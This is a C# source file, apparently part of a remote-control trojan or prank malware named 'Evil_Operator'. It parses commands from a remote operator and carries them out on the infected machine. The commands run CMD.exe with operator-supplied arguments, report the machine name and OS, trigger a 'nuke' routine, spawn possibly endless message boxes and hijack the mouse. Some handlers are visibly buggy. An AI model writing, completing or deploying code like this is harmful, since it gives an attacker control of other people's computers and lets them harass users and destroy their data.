using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
namespace Evil_Operator
{
    class Info
    {
        public int p_sent, p_recv;
    }
    class Command
    {
        public string CMD_NAME;
        public List<CommandsPars> CMD_VARS = new List<CommandsPars>();

        public class CommandsPars
        {
            public string varName;
            public string varValue;
        }
    }

    class Scripts
    {
        public float Version = 0.5f;
        public Packet packet;
        int i_seperator = 0, i_index = 0, c_ends = 0,c_ount =0;
        string temp_string;

        Mouse mouse = new Mouse();
        MBox mbox = new MBox();
        Nuke nuke = new Nuke();
        
        Command cmdToAdd = new Command();
        List<Command> cmd_list = new List<Command>();
        public Info info = new Info();

        public Scripts()
        {
            Thread thread = new Thread(new ThreadStart(mouse.Start));
            thread.Start();
            
        }

        public void Decode()
        {
            packet.ConvertRecvtoString();
            i_seperator = 0;
            c_ends = 0;
            try
            {
                c_ends = packet.strRecv.Count(x => x == ';');//Check how many instances of ';' are in the packet.
                Console.WriteLine("Found " + c_ends + " cmd seperators");
                for (int i = 0; i < c_ends; i++)// make a loop equal to the amount of ';' which would signify a command
                {
                    cmdToAdd.CMD_NAME = "NULL";
                    temp_string = packet.strRecv.Substring(i_seperator, packet.strRecv.IndexOf(';', i_seperator + 1) - i_seperator + 1);
                    i_seperator = packet.strRecv.IndexOf(';', i_seperator) + 1;
                    i_index = 0;
                    Console.WriteLine("Seperated packet:" + temp_string);
                    while (temp_string.IndexOf(';') != i_index)
                    {
                        cmdToAdd.CMD_VARS.Add(new Command.CommandsPars());
                        cmdToAdd.CMD_VARS[c_ount].varName = "NULL";
                        cmdToAdd.CMD_VARS[c_ount].varValue = "NULL";

                        if (i_index == 0)
                        {
                            cmdToAdd.CMD_NAME = temp_string.Substring(0, 2);
                            Console.WriteLine("CMD" + i + ":" + cmdToAdd.CMD_NAME);
                            i_index = 2;
                        }
                        if (temp_string.IndexOf('~', i_index) != -1)
                        {

                            i_index = temp_string.IndexOf('~', i_index);
                            //Console.WriteLine("No second '~' found to substring with.\nLooking to substring with =");
                            try
                            {
                                cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf('=', i_index) - i_index - 1);
                                i_index = temp_string.IndexOf('=', i_index);
                                Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                try
                                {
                                    cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index + 1, temp_string.IndexOf('~', i_index) - i_index - 1);
                                    Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                    i_index = temp_string.IndexOf('~', i_index + 1);
                                }
                                catch
                                {
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index + 1, temp_string.IndexOf(';') - i_index - 1);
                                        Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                        i_index = temp_string.IndexOf(';', i_index + 1);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("Nothing found. Sending Error report.");
                                    }
                                }
                            }
                            catch (ArgumentOutOfRangeException)
                            {
                                try
                                {
                                    //No = found to substring with.\nAttempting to substring between two ~
                                    cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf('~', i_index + 1) - i_index);
                                    i_index = temp_string.IndexOf('~', i_index + 1);
                                    Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    //No = found to substring with.\nLooking to substring with ;
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf(';') - i_index - 1);
                                        i_index = temp_string.IndexOf(';');
                                        Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                    }
                                    catch (ArgumentOutOfRangeException)
                                    {
                                        Console.WriteLine("Nothing found, sending error report.");
                                        packet.strRecv = "ER~message=No operators found to end or seperate packets with.#P1";
                                        packet.Toggle();
                                    }
                                }
                            }
                        }
                        else
                        {
                            //"No ~ found. Attempting to substring with ="
                            try
                            {
                                cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index, temp_string.IndexOf('~', i_index) - i_index);
                                i_index = temp_string.IndexOf('~', i_index + 1);
                                Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                try
                                {
                                    cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index, temp_string.IndexOf('=', i_index + 1) - i_index);
                                    i_index = temp_string.IndexOf('=', i_index + 1);
                                    Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName + "\nAttempting to extract value with ~");
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    //No = found to seperate with.\nAttempting with ;
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index, temp_string.IndexOf(';'));
                                        Console.WriteLine("CMD:" + cmdToAdd.CMD_NAME);
                                        i_index = temp_string.IndexOf(';');
                                    }
                                    catch (ArgumentOutOfRangeException)
                                    {
                                        Console.WriteLine("No ; found. Sending Error Report.");
                                        packet.strSend = "ER~messag=No way this happened.#P1";
                                        packet.Toggle();
                                    }
                                }
                            }
                            catch (ArgumentOutOfRangeException)
                            {
                                //Failed to get value with ~.\nAttempting to get value with ;
                                try
                                {
                                    if (i_index != temp_string.IndexOf(';'))
                                    {
                                        Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                        cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index, temp_string.IndexOf(';') - i_index);
                                        i_index = temp_string.IndexOf(';');
                                        Console.WriteLine("Value2:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                    }
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    Console.WriteLine("Failed to get anything. Sending Error Report.");
                                    packet.strSend = "ER~message=No operator to seperate with found #E1";
                                }
                            }
                        }
                        c_ount++;
                    }
                    cmd_list.Add(new Command());
                    cmd_list[i].CMD_NAME = cmdToAdd.CMD_NAME;
                    cmd_list[i].CMD_VARS = cmdToAdd.CMD_VARS.ToList();

                    Console.WriteLine(i + ":Saving CMD:" + cmdToAdd.CMD_NAME + "\nVName:" + cmdToAdd.CMD_VARS[0].varName + "\nVValue:" + cmdToAdd.CMD_VARS[0].varValue);
                    temp_string = "";
                    cmdToAdd.CMD_VARS.Clear();
                    c_ount = 0;
                    Console.WriteLine("New command added.\n");
                }
                ExecCommands();
            }
            catch (ArgumentNullException)
            {
                Console.WriteLine("No end operator ';' found.");
                packet.strSend = "ER~message=Packet Error: Packet recieved without end operator;";
                packet.Toggle();
            }
            catch (OverflowException)
            {
                Console.WriteLine("Too many end operators ';', overflow caused.");
                packet.strSend = "ER~message=Packet Error: Too many end operators, overflow caused.;";
                packet.Toggle();
            }
        }

        //---------------------------------------------------Commands implications

        private void ExecCommands()
        {
            foreach (Command CMD in cmd_list)
            {

                switch (CMD.CMD_NAME)
                {

                    case "NK":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "":
                                    nuke.NukeIt();
                                    break;
                            }
                        }
                        break;
                    case "IN":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "name":
                                    packet.strSend += "IN~name=" + Environment.MachineName + ";";
                                    break;

                                case "os":
                                    packet.strSend += "IN~os=" + Environment.OSVersion + ";";
                                    break;

                                case "p_sent":
                                    packet.strSend += "IN~p_sent=" + info.p_sent + ";";
                                    break;

                                case "p_recieved":
                                    packet.strSend += "IN~p_recieved=" + info.p_sent + ";";
                                    break;
                            }
                        }
                        break;
                    case "RV":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "number":
                                    packet.strSend += "RV~number=" + Version.ToString() + ";";
                                    packet.Toggle();
                                    break;
                                case "NULL":
                                    packet.strSend += "RV~number=" + Version.ToString() + ";";
                                    packet.Toggle();
                                    break;
                                default:
                                    packet.strSend += "RV~number=" + Version.ToString() + ";";
                                    packet.Toggle();
                                    break;
                            }
                        }
                        break;
                    case "RP":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "number":
                                    packet.strSend += "RP~TTL=unknown;";
                                    packet.Toggle();
                                    break;
                            }
                        }
                        break;
                    case "ON":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "":
                                    break;
                            }
                        }
                        break;
                    case "CM":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "command":
                                    Console.WriteLine("CM: " + CMD.CMD_VARS.ToString());
                                    System.Diagnostics.Process.Start("CMD.exe", CMD.CMD_VARS.ToString());
                                    break;
                            }
                        }
                        break;
                    case "MB":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "type":
                                    mbox.type = Convert.ToInt32(par.varValue);
                                    break;
                                case "numBoxes":
                                    mbox.numofBox = Convert.ToInt32(par.varValue);
                                    break;
                                case "inf":
                                    mbox.inf = Convert.ToBoolean(par.varValue);
                                    break;
                                case "msg":
                                    mbox.msg = par.varValue;
                                    break;
                            }
                        }
                        mbox.Launch();

                        break;
                    case "MS":
                        foreach (var par in CMD.CMD_VARS)
                        {
                            switch (par.varName)
                            {
                                case "speed":
                                    mouse.speed = Convert.ToInt32(par.varValue);
                                    break;
                                case "smax":
                                    mouse.smax = Convert.ToInt16(par.varValue);
                                    break;
                                case "smin":
                                    mouse.smin = Convert.ToInt16(par.varValue);
                                    break;
                                case "lrpulse":
                                    mouse.lrpulse = Convert.ToInt16(par.varValue);
                                    break;
                                case "sgrade":
                                    mouse.sgrade = Convert.ToBoolean(par.varValue);
                                    break;
                                case "srandom":
                                    mouse.srandom = Convert.ToBoolean(par.varValue);
                                    break;
                                case "lrandom":
                                    mouse.lrandom = Convert.ToBoolean(par.varValue);
                                    break;
                                case "lscanx":
                                    mouse.lscanx = Convert.ToBoolean(par.varValue);
                                    break;
                                case "lscany":
                                    mouse.lscany = Convert.ToBoolean(par.varValue);
                                    break;
                                case "linvX":
                                    mouse.linvX = Convert.ToBoolean(par.varValue);
                                    break;
                                case "linvY":
                                    mouse.livnY = Convert.ToBoolean(par.varValue);
                                    break;
                            }
                        }
                        if (mouse.speed != -1)
                        {
                            mouse.ApplyMouseSpeed(mouse.speed);
                        }
                        else
                        {
                            mouse.ApplyMouseSpeed(10);
                        }
                        break;
                }
            }
            cmd_list.Clear();
        }

    }
}
